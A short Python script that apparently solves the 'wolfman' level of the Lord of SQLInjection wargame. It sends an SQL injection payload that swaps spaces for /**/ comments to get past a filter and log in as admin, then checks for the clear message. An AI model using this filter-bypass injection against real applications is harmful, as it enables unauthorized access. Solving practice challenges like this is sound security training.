import requests

url = 'https://los.rubiya.kr/chall/wolfman_4fdc56b75971e41981e3d1e2fbe9b7f7.php'
cookie = {'PHPSESSID': 'your cookie'}
payload = "?pw='/**/or/**/id='admin"

r = requests.get(url + payload, cookies=cookie)
if 'WOLFMAN Clear!' in r.text:
    print('WOLFMAN Clear!')
